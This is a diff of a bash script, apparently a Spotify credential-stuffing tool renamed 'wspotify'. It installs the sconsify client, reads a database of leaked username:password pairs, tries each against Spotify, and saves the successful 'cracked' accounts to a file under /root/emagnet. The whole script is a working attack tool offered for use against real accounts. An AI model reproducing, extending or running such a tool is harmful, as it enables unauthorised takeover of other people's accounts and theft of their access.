@@ -22,7 +22,7 @@
 ####  GNU General Public License for more details.                         #####
 ####                                                                       #####
 ####  You must obey the GNU General Public License. If you will modify     #####
-####  emagnet file(s), you may extend this exception to your version       #####
+####  wspotify file(s), you may extend this exception to your version      #####
 ####  of the file(s), but you are not obligated to do so.  If you do not   #####
 ####  wish to do so, delete this exception statement from your version.    #####
 ####  If you delete this exception statement from all source files in the  #####
@@ -46,24 +46,31 @@ __      _____ _ __   ___ | |_(_)/ _|_   _
 EOF
 }
 
-if [[ ! -f "/usr/include/portaudiocpp/" ]]; then
-      echo -e "$basename$0: internal error: portaudio is required to be installed ...";
-      exit 1
+find /usr/include -type d |grep 'libspotify' &> /dev/null
+             if [[ "$?" -ne "0" ]]; then
+             if [[ -z "$LIBSPOTIFY" ]]; then
+                         printf "Libspotify is deprecated but is required for $basename$0 bruteforcing\nto work, do you have libspotify installed? (YES/no): "
+               read LIBSPOTIFY
+                 if ! [[ "$LIBSPOTIFY" = "YES" ]]; then
+                  echo "Can't continue until libspotify has been installed.."
+                   echo "Exiting.."
+                   exit 1
+                 fi
 fi
-
-sconsify -version &> /dev/null
+fi
+./sconsify -version &> /dev/null
    if [[ "$?" -ne "0" ]]; then
         echo "Sconsify is required to be installed before we attacking targets.."
          read -p "Download and install sconsify (y/N): " installsconsify
-          if [[ "$installsconsify" -eq "y" ]]; then
+          if [[ "$installsconsify" = "y" ]]; then
              echo -e "Hold on, downloading sconsify.."
              wget -q --user-agent="${USERAGENT}" "https://github.com/fabiofalci/sconsify/releases/download/next-20180428/linux-x86_64-sconsify-0.6.0-next.zip"
              echo -e "Unzipping sconsify into current dir.."
              unzip -q -o "linux-x86_64-sconsify-0.6.0-next.zip"
              chmod +x ./sconsify
              echo -e "Cleaning up."
-             rm "linux-x86_64-sconsify-0.6.0-next.zip"
              echo "All done.."
+             rm linux* &> /dev/null
              sleep 2
          else
             echo -e "$basename$0: internal error -- sconsify is required to be installed.."
@@ -76,10 +83,13 @@ sconsify -version &> /dev/null
 if [[ -z "$1" ]]; then
    banner
    echo -e "You must choose at least one database ... "
+   echo -e "Example usage: ./wspotify database.txt"
+   echo -e "-----------------------------------------------------------"
    exit 1
 fi
 
 banner
+
 while read line; do
  SPOTIFY_USER="$(echo $line|cut -d: -f1)"
  SPOTIFY_PASS="$(echo $line|cut -d: -f2)"
@@ -87,6 +97,7 @@ while read line; do
      if [[ "$?" -eq "0" ]]; then
          echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
       else
-          echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}" | tee ~/cracked-spotify-accounts.txt
+          echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}" 
+          echo -e "${SPOTIFY_USER}:${SPOTIFY_PASS}" >> /root/emagnet/cracked-accounts/cracked-spotify-accounts.txt
       fi
 done < $1
